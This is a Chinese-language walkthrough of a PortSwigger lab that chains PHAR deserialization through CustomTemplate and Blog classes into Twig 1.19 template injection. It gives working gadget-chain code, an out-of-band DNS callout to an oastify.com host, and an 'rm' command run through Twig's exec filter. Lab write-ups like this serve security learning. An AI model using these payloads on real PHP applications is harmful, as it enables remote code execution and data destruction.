# 实验：利用 PHAR 反序列化部署自定义 Gadget Chain

https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain

本实验并未显式使用反序列化。但是，如果你将 `PHAR` 反序列化与其他高级黑客技术相结合，仍然可以通过自定义 gadget chain（小工具链）实现远程代码执行。

为了解决本实验，请从 Carlos 的主目录中删除 `morale.txt` 文件。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

    ```http

            ```

探测与文件相关的功能是否存在调用文件方法以触发 phar 隐式序列化，尝试访问头像代码文件
- 直接访问，无效
- 末尾添加斜杠
    ```http
    GET /cgi-bin/avatar.php/ HTTP/2
    ```
    - 服务器响应

        ```php
        <?php

        require_once('CustomTemplate.php');
        require_once('Blog.php');

        chdir('../avatars/');

        $avatar_file_path = $_GET['avatar'] . '.jpg';
        // 使用 file_exists 检测文件是否存在，此时已触发 phar 隐式序列化
        if (file_exists($avatar_file_path)) {
            // 检测是否存在路径遍历字符
            if (strpos($_GET['avatar'], "\\") !== false || strpos($_GET['avatar'], "/") !== false || strpos($_GET['avatar'], ".") !== false) {
                throw new Exception("File name is invalid: " . $avatar_file_path);
            }
            header("content-type: image/jpeg");
            readfile($avatar_file_path);
        } else {
            header("Status: 404 Not Found");
            echo "Not Found";
        }

        ?>
        ```
        - 设置参数 `avatar` 即可触发 phar 隐式序列化


读取源码以探索自定义反序列化工具链
- 读取用户模板源码
    ```http
    GET /cgi-bin/CustomTemplate.php~ HTTP/2
    ```
    - 响应
        ```php
        <?php

        class CustomTemplate {
            private $template_file_path;

            ...

            // 销毁魔术方法，触发时删除文件
            function __destruct() {
                // Carlos thought this would be a good idea
                @unlink($this->lockFilePath());
            }
            // 返回文件路径，使用字符串拼接
            private function lockFilePath()
            {
                // /home/carlos/cgi-bin/templates/ 参数路径 .lock
                return 'templates/' . $this->template_file_path . '.lock';
            }
        }

        ?>
        ```
        - 路径位置
            - 目标文件路径为 
                `/home/carlos/morale.txt`
            - `lockFilePath()` 返回的路径格式为
                `/home/carlos/cgi-bin/templates/$参数路径.lock`
            - 路径遍历与空字节阻断为 `$参数=../../morale.txt%00`


自定义载荷的 phar 工具 https://github.com/kunte0/phar-jpg-polyglot

尝试构造载荷
- 使用路径遍历与空字节截断
    ```php
    class CustomTemplate {
        private $template_file_path;
        public function __construct($template_file_path) {
            $this->template_file_path = $template_file_path;
        }
    }
    $object = new CustomTemplate('../../morale.txt\0');
    ```
    - 服务器响应 `Not Found` 
        - 未通过挑战，且空字节本身可能导致反序化重建时失败（空字节即为序列化串的一部分，虽然不一定为此处失败的核心）

    - `CustomTemplate` 对象不足以执行目标功能

继续探索最后的源码
- 读取博客源码
    ```http
    GET /cgi-bin/Blog.php~ HTTP/2
    ```
    - 服务器响应
        ```php
        <?php

        require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

        class Blog {
            public $user;
            public $desc;
            private $twig;

            // 字符串魔术方法
            public function __toString() {
                // 渲染名为 'index' 的模板，传递参数名值对，名 'user'，值对象属性 user
                // 此处执行模板内的任意代码
                return $this->twig->render('index', ['user' => $this->user]);
            }
            // 反序化时调用的魔术方法
            public function __wakeup() {
                // 设置模板数组中的名值对，模板名 'index'，值为对象属性 desc
                $loader = new Twig_Loader_Array([
                    'index' => $this->desc,
                ]);
                $this->twig = new Twig_Environment($loader);
            }

            public function __sleep() {
                return ["user", "desc"];
            }
        }

        ?>
        ```
        - 揭示模板版本 php-twig-1.19
        - 存在两个魔法函数，且存在模板代码执行

序列化代码路径
- `Blog` 对象，作为核心载荷
    - 反序列化魔术方法 `__wakeup` 中，`Blog->desc` 属性设置后的模板代码
    - 字符串魔术方法 `__toString` 被触发即渲染模板以执行模板代码

- `CustomTemplate` 对象，作为最外层的初始立足点
    - 销毁魔术方法 `__destruct` 中，代码路径将触发字符串拼接操作，从而触发 Blog 对象的字符串魔术方法

最终载荷
- 序列化载荷构造
    ```php
    class Blog {
        public $user;
        public $desc;

        public function __construct($temp_code)
        {
            // 设置模板代码
            $this->desc = $temp_code;
            // 仅存在，以确保代码路径中属性不缺失
            $this->user = 0;
        }
    }

    class CustomTemplate {
        private $template_file_path;

        public function __construct($temp_code)
        {
            // 作为立足点，设置后续核心载荷对象
            $this->template_file_path = new Blog($temp_code);
        }
    }

    $object = new CustomTemplate('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("host id.oastify.com")}}');

    $object = new CustomTemplate('{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}');
    ```
    - php-twig-1.19 模板存在已知命令执行漏洞：
        - 注册未知过滤器回调函数
        - 设置未知过滤器，此时触发回调函数的同时未知过滤器字符串作为参数传递

- 向 phar 反序列化端点添加 phar 包装器前缀
    ```http
    GET /cgi-bin/avatar.php?avatar=phar://wiener HTTP/2
    ```
    - 成功得到 DNS 请求，成功删除文件通关
